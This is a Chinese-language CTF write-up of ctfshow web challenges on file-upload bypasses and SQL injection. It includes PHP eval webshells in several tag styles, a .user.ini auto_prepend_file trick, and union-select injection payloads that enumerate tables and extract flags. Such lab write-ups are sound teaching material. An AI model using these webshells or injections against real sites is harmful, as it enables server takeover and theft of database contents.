# 0xGame—Web（week1）

### **一、文件上传（web151-170）**

#####  1.web151前端文件类型绕过

发现上传功能点，测试发现只能传png格式的文件

![](https://cdn.nlark.com/yuque/0/2025/png/51646461/1761925574042-74566bb9-2b2c-41de-903b-99218e0f8a94.png)

因为传文件的功能点只在前端验证文件类型，所以先传png后缀的文件，再用BP抓包修改为php后缀
    
    
    <?php
      @eval($_REQUEST["cmd"]);
    ?>

  * `<?php ... ?>` \- PHP标签
  * `@` \- 错误抑制运算符，隐藏错误信息
  * `eval()` \- 执行字符串作为PHP代码的函数
  * `$_REQUEST["cmd"]` \- 获取通过GET、POST或COOKIE传递的cmd参数
  * `;` \- PHP语句结束符



  


![](https://cdn.nlark.com/yuque/0/2025/png/51646461/1761927995731-d8b7a72f-a360-4ab4-b7c3-e29c581b7270.png)

![](https://cdn.nlark.com/yuque/0/2025/png/51646461/1761926576326-2b6e1bb9-a524-49c9-bf06-1975dba51ce9.png)

在蚁剑中新建数据，密码要和php文件传进去的参数一致

![](https://cdn.nlark.com/yuque/0/2025/png/51646461/1761928748142-f2d120eb-efe0-489b-8d37-ea1a237930c9.png)

在前一个目录找到flag.php文件

![](https://cdn.nlark.com/yuque/0/2025/png/51646461/1761928849715-007216f4-34e5-4ee8-9ae0-8207eb965a9e.png)

还可以再在前端代码修改，把只能传png的限制改成png|php

##### 2.web152后台检验

![](https://cdn.nlark.com/yuque/0/2025/png/51646461/1761929941002-7e416fd0-78eb-43b2-9bc3-544eafc74dc2.png)

Content-type详情见：[https://developer.mozilla.org/zh-CN/docs/Web/HTTP](<https://developer.mozilla.org/zh-CN/docs/Web/HTTP>)

![](https://cdn.nlark.com/yuque/0/2025/png/51646461/1761930105711-dfd2be89-33cf-4446-abbb-770886fd124e.png)

所以不用修改前端代码的办法进行上传依旧可以

##### 3.web153.user.ini

由于**.user.ini** 文件可以覆盖某些 PHP 配置，它也可能被恶意利用来绕过服务器管理员设置的限制，例如：

文件上传限制：

如果服务器全局设置了较低的文件上传大小限制，恶意用户可以通过 .user.ini 文件增加 upload_max_filesize 和 post_max_size，来上传更大的文件。

脚本执行时间：

恶意用户可能会增加 max_execution_time 以避免执行超时，从而进行更长时间的恶意活动，如暴力破解等。

内存限制：

增加 memory_limit 可以帮助恶意脚本在执行时获取更多的服务器资源，可能导致拒绝服务攻击。

PHP 文件包含漏洞：

auto_prepend_file在 PHP 中，当用户访问.user.ini所在目录主页文件时，auto_prepend_file所指向的文件内容，会自动进行包含，将文件内容当作php代码执行
    
    
    ; 这是一个注释，说明下面是设置上传文件的最大大小
    upload_max_filesize = 64M
    ; 这是设置POST数据的最大大小
    post_max_size = 64M
    ; 设置PHP脚本执行的最长时间（秒）
    max_execution_time = 120
    ; 设置PHP脚本用于解析请求数据的最大输入时间（秒）
    max_input_time = 60
    ; 设置PHP的内存限制
    memory_limit = 256M

**.user.ini文件上传漏洞的原理与思路大致如下：**

  * 在任何人访问包含恶意 `.user.ini` 的目录中的PHP文件或服务器处理该目录下的PHP文件时，.user.ini会自动生效，“auto_prepend_file=shell.png”类似的代码就会被执行，其中的shell文件中的php代码也会自动执行



![](https://cdn.nlark.com/yuque/0/2025/png/51646461/1761993603707-7aca790f-7ec4-457d-aa80-a5368e8c3db1.png)

写一个.user.ini.png文件，在BP中拦截删掉后缀png再传

shell.png还是一句话木马

![](https://cdn.nlark.com/yuque/0/2025/png/51646461/1761993736053-a7e82898-0c3c-41c0-9996-5589956a4c4b.png)

在蚁剑中连接时URL路径里不要加shell.png，访问upload时会触发.user.ini，shell.png中的代码也同时会被触发，剩下的一样，在上一级路径中找到flag.php

##### 4.web154短标签绕过

![](https://cdn.nlark.com/yuque/0/2025/png/51646461/1761993996034-ba7c2e37-f331-4183-bbd6-a520600b37fd.png)

上传shell.php后发现回显文件内容不合规，有三种标签绕过方法
    
    
    //正常写法
    <?php    @eval($_POST['cmd']);    ?> 
    
    //短标签，适合过滤php         
    <?=    
    @eval($_POST['cmd']);     
    ?> 
    
    //asp风格               
    <%    
     @eval($_POST['cmd']);     
    %>  
      
    //<script>风格，适合过滤<?
    <script language='php'>    
      @eval($_POST['cmd']);     
    </script>  

  


  


  


  


  


  


  


  


  


  


  


  


  


  


  


  


  


  


  


  


  


  


  


  


  


  


  


  


  


  


  


  


  


  


  


  


  


  


  


  


  


  


  


  


  


  


  


  


  


  


  


  


  


  


  


  


  


  


  


### **二、SQL注入（web171-253）**

#####  1、web172基于联合注入的绕过

![](https://cdn.nlark.com/yuque/0/2025/png/51646461/1762156184872-088b4108-b5de-4e2e-bd62-0456cc297276.png)

发现返回逻辑里当username==flag时无法返回数据，所以进行绕过
    
    
    -1' union select 1,2 --+ 

![](https://cdn.nlark.com/yuque/0/2025/png/51646461/1762156402302-eabbd64c-5c29-4c28-9b0a-ecb7668e371b.png)

得到用户名为第一栏
    
    
    -1' union select to_base64(username),hex(password) from ctfshow_user2 --+

-1是为了让查询结果为无，以免影响后续查询，to_base64()是转换成base64编码，hex()同理

##### 2、web173基于联合注入的绕过

本题仍旧是绕过，
    
    
    //检查结果是否有flag
        if(!preg_match('/flag/i', json_encode($ret))){
          $ret['msg']='查询成功';
        }

题中给出的代码是防止flag直接被查询到的，所以需要分段查询

①正常联合注入
    
    
    #查询数据库名字
    -1' union select 1,2,(select database()) --+      #回显为ctfshow_web
    #查询当前数据库表名
    -1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema = 'ctfshow_web' --+
    #查询当前表（ctfshow_user3）的字段名
    -1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name = 'ctfshow_user3' --+
    #查询flag(字段有 id,username,password)
    -1' union select 1,2,(select password from ctfshow_user3 where username = 'flag') --+

②利用编码函数绕过
    
    
    -1' union select 1,2,password from ctfshow_user3 where to_base64(username) = 'ZmxhZw==' --+

利用to_base64函数绕过flag检测，在条件里加入flag的base64的值即可得到flag
